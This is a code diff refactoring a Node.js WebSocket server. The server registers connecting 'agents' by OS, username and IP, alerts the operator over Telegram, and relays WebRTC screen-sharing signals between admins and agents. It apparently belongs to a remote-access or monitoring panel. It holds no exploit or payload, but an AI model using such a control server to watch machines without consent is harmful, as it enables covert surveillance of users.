@@ -131,52 +131,55 @@ wss.on('connection', (ws, req) => {
  return;
  }
 
- // 2. Agent Info Packet
+ // 2. Agent Info Packet - THE CORE FIX
  if (data.type === 'info') {
- // Check if this specific WebSocket ID is already known
- let existingWsId = null;
+ // Check if this WebSocket ID belongs to an EXISTING known user
+ let existingUserId = null;
  for (const uid in knownUsers) {
  if (knownUsers[uid].ws && knownUsers[uid].ws.id === ws.id) {
- existingWsId = uid;
+ existingUserId = uid;
  break;
  }
  }
 
- if (existingWsId) {
-     // Update the existing user with this WS connection
-     knownUsers[existingWsId].info = data;
-     knownUsers[existingWsId].lastSeen = Date.now();
-     knownUsers[existingWsId].status = 'Online';
+ if (existingUserId) {
+ // UPDATE existing user record
+ knownUsers[existingUserId].info = data;
+ knownUsers[existingUserId].lastSeen = Date.now();
+ knownUsers[existingUserId].status = 'Online';
+ // Notify admins of update
+ broadcastToAdmin(existingUserId, data);
  } else {
-     knownUsers[id] = { 
-         ws: ws, // Ensure the ws object is tied
-         info: data, 
-         lastSeen: Date.now(), 
-         status: 'Online' 
-     };
-     notifyAdmin(id, `🟢 New User: ${data.os || 'Unknown'} (${data.user || 'Unknown'})`);
-     broadcastToAdmin(id, data);
-     notifyTelegram(`🛡️ NEW AGENT CONNECTED\nID: ${id}\nOS: ${data.os || 'Unknown'}\nUser: ${data.user || 'Unknown'}\nIP: ${data.ip || 'Unknown'}`);
+ // CREATE new user record
+ knownUsers[id] = { 
+ ws: ws, 
+ info: data, 
+ lastSeen: Date.now(), 
+ status: 'Online' 
+ };
+ notifyAdmin(id, `🟢 New User: ${data.os || 'Unknown'} (${data.user || 'Unknown'})`);
+ broadcastToAdmin(id, data);
+ notifyTelegram(`🛡️ NEW AGENT CONNECTED\nID: ${id}\nOS: ${data.os || 'Unknown'}\nUser: ${data.user || 'Unknown'}\nIP: ${data.ip || 'Unknown'}`);
  }
  } 
  // 3. Heartbeat
  else if (data.type === 'heartbeat') {
-     // FIX: Update the heartbeat of the actual connected client
-     if (clients[id]) {
-         clients[id].lastSeen = Date.now();
-         // Also update knownUsers if we can find it
-         for(const uid in knownUsers) {
-             if(knownUsers[uid].ws && knownUsers[uid].ws.id === ws.id) {
-                 knownUsers[uid].lastSeen = Date.now();
-                 knownUsers[uid].status = 'Online';
-                 break;
-             }
-         }
-     }
+ // Update last seen for the connected socket
+ if (clients[id]) {
+ clients[id].lastSeen = Date.now();
+ // Also update knownUsers if linked
+ for(const uid in knownUsers) {
+ if(knownUsers[uid].ws && knownUsers[uid].ws.id === ws.id) {
+ knownUsers[uid].lastSeen = Date.now();
+ knownUsers[uid].status = 'Online';
+ break;
+ }
+ }
+ }
  } 
- // 4. WebRTC Signaling
+ // 4. WebRTC Signaling - RELAY LOGIC
  else if (['offer', 'answer', 'candidate'].includes(data.type)) {
- // If Agent sends Offer -> Forward to Admin
+ // If Agent sends Offer -> Forward to ALL Admins
  if (!ws.isAdmin && data.targetId === 'admin') {
  wss.clients.forEach(client => {
  if (client.readyState === WebSocket.OPEN && client.isAdmin) {
@@ -189,31 +192,18 @@ wss.on('connection', (ws, req) => {
  }
  });
  }
- // If Admin sends Offer -> Forward to specific Agent
+ // If Admin sends Offer/Candidate -> Forward to SPECIFIC Agent
  else if (ws.isAdmin && data.targetId) {
- if (clients[data.targetId]) {
- const targetWs = clients[data.targetId].ws;
+ if (knownUsers[data.targetId] && knownUsers[data.targetId].ws) {
+ const targetWs = knownUsers[data.targetId].ws;
  if (targetWs.readyState === WebSocket.OPEN) {
  targetWs.send(JSON.stringify(data));
  }
  }
  }
- // If Agent sends Answer -> Forward to Admin
- else if (!ws.isAdmin && data.targetId === 'admin') {
- wss.clients.forEach(client => {
- if (client.readyState === WebSocket.OPEN && client.isAdmin) {
- client.send(JSON.stringify({ 
- type: data.type, 
- targetId: id, 
- sdp: data.sdp,
- candidate: data.candidate
- }));
- }
- });
- }
  // Fallback: Agent to Agent
- else if (data.targetId && clients[data.targetId]) {
- const targetWs = clients[data.targetId].ws;
+ else if (data.targetId && knownUsers[data.targetId]) {
+ const targetWs = knownUsers[data.targetId].ws;
  if (targetWs.readyState === WebSocket.OPEN) {
  targetWs.send(JSON.stringify(data));
  }
@@ -234,8 +224,8 @@ wss.on('connection', (ws, req) => {
  // 6. Admin Request Join
  else if (data.type === 'request_join') {
  const targetId = data.targetId;
- if (clients[targetId]) {
- clients[targetId].ws.send(JSON.stringify({
+ if (knownUsers[targetId] && knownUsers[targetId].ws) {
+ knownUsers[targetId].ws.send(JSON.stringify({
  type: 'start_join',
  from: id, 
  timestamp: Date.now()
@@ -245,14 +235,11 @@ wss.on('connection', (ws, req) => {
  }
  // Generic Fallback
  else {
- if (!knownUsers[id]) {
- knownUsers[id] = { info: { os: 'Unknown', user: 'Unknown', ip: 'Unknown' }, lastSeen: Date.now(), status: 'Online' };
+ // Only log if it's not a known handled type
+ if (!['registered', 'alert', 'info', 'screen_data', 'heartbeat', 'system', 'system_log'].includes(data.type)) {
+     notifyAdmin(id, `📺 Screen Active: ${id}`);
+     broadcastToAdmin(id, data);
  }
- if (!knownUsers[id].info) {
-     knownUsers[id].info = { os: 'Unknown', user: 'Unknown', ip: 'Unknown' };
- }
- notifyAdmin(id, `📺 Screen Active: ${id}`);
- broadcastToAdmin(id, data);
  }
  } catch (e) {
  logToFile(`[ERR] Message parsing error from ${id}: ${e.message}`);
